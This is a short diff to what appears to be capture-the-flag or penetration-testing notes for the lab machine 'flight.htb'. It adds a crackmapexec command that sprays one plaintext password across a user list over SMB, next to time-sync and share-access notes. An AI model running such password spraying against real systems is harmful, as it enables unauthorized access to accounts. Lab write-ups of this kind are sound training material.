@@ -211,7 +211,10 @@ sudo date -s 01:22
 ntpdate IP
 date
 ```
-
+Try password on user list:
+```s
+crackmapexec smb flight.htb -u users.txt -p 'S@Ss!K@*t13' --continue-on-success
+```
 
 ## Access share
 ### smbclient
